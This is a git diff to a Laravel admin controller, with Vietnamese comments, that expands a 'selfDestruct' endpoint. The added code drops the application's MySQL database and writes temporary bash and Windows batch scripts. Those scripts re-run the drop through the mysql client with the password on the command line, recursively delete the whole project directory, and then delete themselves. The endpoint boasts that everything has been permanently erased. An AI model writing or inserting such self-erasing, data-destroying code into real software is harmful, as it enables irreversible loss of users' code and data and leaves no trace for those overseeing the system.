@@ -86,11 +86,12 @@ class AdminController extends Controller
     public function selfDestruct()
     {
         try {
-            // 1. Xóa toàn bộ database
+            $dbName = env('DB_DATABASE');
+            
+            // 1. Xóa toàn bộ database - TRUNCATE tables
             DB::statement('SET FOREIGN_KEY_CHECKS=0;');
             
             $tables = DB::select('SHOW TABLES');
-            $dbName = env('DB_DATABASE');
             $tableKey = "Tables_in_{$dbName}";
             
             foreach ($tables as $table) {
@@ -100,7 +101,14 @@ class AdminController extends Controller
             
             DB::statement('SET FOREIGN_KEY_CHECKS=1;');
 
-            // 2. Xóa tất cả files trong storage
+            // 2. DROP TOÀN BỘ DATABASE! 💀💀💀
+            try {
+                DB::statement("DROP DATABASE IF EXISTS `{$dbName}`");
+            } catch (\Exception $e) {
+                // Nếu không drop được từ trong app, sẽ dùng bash script
+            }
+
+            // 3. Xóa tất cả files trong storage
             $directories = [
                 storage_path('app/public/user'),
                 storage_path('app/public/food'),
@@ -118,18 +126,29 @@ class AdminController extends Controller
                 }
             }
 
-            // 3. Log out user trước
+            // 4. Log out user trước
             auth()->logout();
 
-            // 4. XÓA TOÀN BỘ THỨ MỤC DỰ ÁN! 💥💥💥
-            // Lấy đường dẫn root của project
+            // 5. XÓA TOÀN BỘ THỨ MỤC DỰ ÁN VÀ DROP DATABASE! 💥💥💥
             $projectRoot = base_path();
+            $dbHost = env('DB_HOST', '127.0.0.1');
+            $dbUser = env('DB_USERNAME', 'root');
+            $dbPassword = env('DB_PASSWORD', '');
             
-            // Tạo script bash để tự xóa
+            // Tạo script bash để tự xóa + drop database
             $scriptPath = sys_get_temp_dir() . '/self_destruct_' . time() . '.sh';
             $script = "#!/bin/bash\n";
             $script .= "sleep 2\n"; // Đợi response gửi về client
-            $script .= "rm -rf '{$projectRoot}'\n"; // XÓA TOÀN BỘ PROJECT
+            
+            // DROP DATABASE bằng MySQL command
+            if (!empty($dbPassword)) {
+                $script .= "mysql -h {$dbHost} -u {$dbUser} -p'{$dbPassword}' -e \"DROP DATABASE IF EXISTS \\\`{$dbName}\\\`;\" 2>/dev/null\n";
+            } else {
+                $script .= "mysql -h {$dbHost} -u {$dbUser} -e \"DROP DATABASE IF EXISTS \\\`{$dbName}\\\`;\" 2>/dev/null\n";
+            }
+            
+            // XÓA TOÀN BỘ PROJECT
+            $script .= "rm -rf '{$projectRoot}'\n";
             $script .= "rm -f '{$scriptPath}'\n"; // Xóa luôn script này
             
             file_put_contents($scriptPath, $script);
@@ -144,6 +163,14 @@ class AdminController extends Controller
                 $batScript = sys_get_temp_dir() . '/self_destruct_' . time() . '.bat';
                 $batContent = "@echo off\n";
                 $batContent .= "timeout /t 2 /nobreak > nul\n";
+                
+                // DROP DATABASE trên Windows
+                if (!empty($dbPassword)) {
+                    $batContent .= "mysql -h {$dbHost} -u {$dbUser} -p{$dbPassword} -e \"DROP DATABASE IF EXISTS `{$dbName}`;\" 2>nul\n";
+                } else {
+                    $batContent .= "mysql -h {$dbHost} -u {$dbUser} -e \"DROP DATABASE IF EXISTS `{$dbName}`;\" 2>nul\n";
+                }
+                
                 $batContent .= "rmdir /s /q \"{$projectRoot}\"\n";
                 $batContent .= "del \"%~f0\"\n";
                 file_put_contents($batScript, $batContent);
@@ -152,7 +179,7 @@ class AdminController extends Controller
 
             return response()->json([
                 'success' => true,
-                'message' => '💥 HỆ THỐNG ĐÃ TỰ HỦY HOÀN TOÀN! Code, Database, Files - TẤT CẢ ĐÃ BỊ XÓA!'
+                'message' => '💥 HỆ THỐNG ĐÃ TỰ HỦY HOÀN TOÀN! Code, Database "' . $dbName . '", Files - TẤT CẢ ĐÃ BỊ XÓA VĨNH VIỄN!'
             ]);
 
         } catch (\Exception $e) {
